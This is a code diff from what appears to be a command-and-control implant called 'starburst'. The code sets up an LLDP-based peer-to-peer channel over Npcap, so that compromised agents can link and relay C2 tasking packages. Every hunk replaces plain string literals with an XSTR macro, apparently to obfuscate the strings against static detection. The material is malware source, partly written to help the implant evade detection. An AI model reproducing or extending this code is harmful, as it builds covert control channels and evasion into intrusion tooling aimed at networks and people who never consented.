@@ -338,7 +338,7 @@ static uint32_t lldp_build_frame(
     /* Port ID TLV: subtype local, "lldp" */
     tlv_write_hdr( p, LLDP_TLV_PORT_ID, 5 ); p += 2;
     *p++ = LLDP_PORT_LOCAL;
-    memory::copy( p, symbol<char*>( const_cast<char*>( "lldp" ) ), 4 ); p += 4;
+    memory::copy( p, XSTR( "lldp" ), 4 ); p += 4;
 
     /* TTL TLV */
     tlv_write_hdr( p, LLDP_TLV_TTL, 2 ); p += 2;
@@ -502,7 +502,7 @@ static int lldp_send_data(
 
         tlv_write_hdr( p, LLDP_TLV_PORT_ID, 5 ); p += 2;
         *p++ = LLDP_PORT_LOCAL;
-        memory::copy( p, symbol<char*>( const_cast<char*>( "lldp" ) ), 4 ); p += 4;
+        memory::copy( p, XSTR( "lldp" ), 4 ); p += 4;
 
         tlv_write_hdr( p, LLDP_TLV_TTL, 2 ); p += 2;
         p[0] = 0; p[1] = 120; p += 2;
@@ -745,7 +745,7 @@ auto declfn starburst::cmd_lldp_connect(
 
     if ( !iface_name || iface_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "missing interface name" ) ) );
+            XSTR( "missing interface name" ) );
         return;
     }
 
@@ -761,7 +761,7 @@ auto declfn starburst::cmd_lldp_connect(
             inst.heap_alloc( sizeof( LldpLinkState ) ) );
         if ( !state ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+                XSTR( "alloc failed" ) );
             return;
         }
         memory::zero( state, sizeof( LldpLinkState ) );
@@ -771,7 +771,7 @@ auto declfn starburst::cmd_lldp_connect(
     /* resolve Npcap */
     if ( !lldp_resolve_npcap( inst, state ) ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to load Npcap (wpcap.dll)" ) ) );
+            XSTR( "failed to load Npcap (wpcap.dll)" ) );
         return;
     }
 
@@ -782,7 +782,7 @@ auto declfn starburst::cmd_lldp_connect(
     /* open adapter */
     if ( !lldp_open_adapter( inst, state, iface_buf ) ) {
         char err_buf[300] = {};
-        str_copy( err_buf, symbol<char*>( const_cast<char*>( "failed to open adapter: " ) ) );
+        str_copy( err_buf, XSTR( "failed to open adapter: " ) );
         str_concat( err_buf, iface_buf );
         queue_response( inst, task_uuid, RESPONSE_ERROR, err_buf );
         return;
@@ -799,7 +799,7 @@ auto declfn starburst::cmd_lldp_connect(
     if ( lldp_recv_message( inst, state, peer_mac, &p2p_data, &p2p_len,
                             LLDP_CONNECT_TIMEOUT_MS ) < 0 || !p2p_data ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no LLDP response from P2P agent" ) ) );
+            XSTR( "no LLDP response from P2P agent" ) );
         return;
     }
 
@@ -809,7 +809,7 @@ auto declfn starburst::cmd_lldp_connect(
     if ( !link ) {
         inst.heap_free( p2p_data );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
@@ -844,7 +844,7 @@ auto declfn starburst::cmd_lldp_connect(
     if ( !pkg ) {
         inst.heap_free( p2p_data );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
@@ -852,7 +852,7 @@ auto declfn starburst::cmd_lldp_connect(
     package_add_byte( inst, pkg, C2_PROFILE_LLDP );
     package_add_int32( inst, pkg, link->link_id );
     package_add_string( inst, pkg, link->agent_id ? link->agent_id :
-        symbol<char*>( const_cast<char*>( "" ) ) );
+        XSTR( "" ) );
     package_add_bytes( inst, pkg, p2p_data, p2p_len );
 
     inst.heap_free( p2p_data );
@@ -864,7 +864,7 @@ auto declfn starburst::cmd_lldp_connect(
 
     /* success response */
     char resp_buf[512] = {};
-    str_copy( resp_buf, symbol<char*>( const_cast<char*>( "LLDP linked to " ) ) );
+    str_copy( resp_buf, XSTR( "LLDP linked to " ) );
 
     char mac_str[18] = {};
     for ( int i = 0; i < 6; i++ ) {
@@ -873,9 +873,9 @@ auto declfn starburst::cmd_lldp_connect(
         mac_str[i*3+2] = ( i < 5 ) ? ':' : '\0';
     }
     str_concat( resp_buf, mac_str );
-    str_concat( resp_buf, symbol<char*>( const_cast<char*>( "\nAgent: " ) ) );
+    str_concat( resp_buf, XSTR( "\nAgent: " ) );
     str_concat( resp_buf, link->agent_id ? link->agent_id :
-        symbol<char*>( const_cast<char*>( "unknown" ) ) );
+        XSTR( "unknown" ) );
 
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, resp_buf );
 }
@@ -898,7 +898,7 @@ auto declfn starburst::cmd_lldp_disconnect(
 
     if ( !agent_uuid || agent_uuid_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "missing agent id" ) ) );
+            XSTR( "missing agent id" ) );
         return;
     }
 
@@ -941,10 +941,10 @@ auto declfn starburst::cmd_lldp_disconnect(
 
     if ( found ) {
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "LLDP link disconnected" ) ) );
+            XSTR( "LLDP link disconnected" ) );
     } else {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "LLDP link not found" ) ) );
+            XSTR( "LLDP link not found" ) );
     }
 }
 
@@ -1028,7 +1028,7 @@ auto declfn starburst::lldp_poll_links(
                 if ( dpkg ) {
                     package_add_byte( inst, dpkg, ACTION_LINK_MSG );
                     package_add_string( inst, dpkg, link->agent_id ?
-                        link->agent_id : symbol<char*>( const_cast<char*>( "" ) ) );
+                        link->agent_id : XSTR( "" ) );
                     package_add_bytes( inst, dpkg, parsed[ci].data, chunk_len );
 
                     uint32_t dlen = 0;
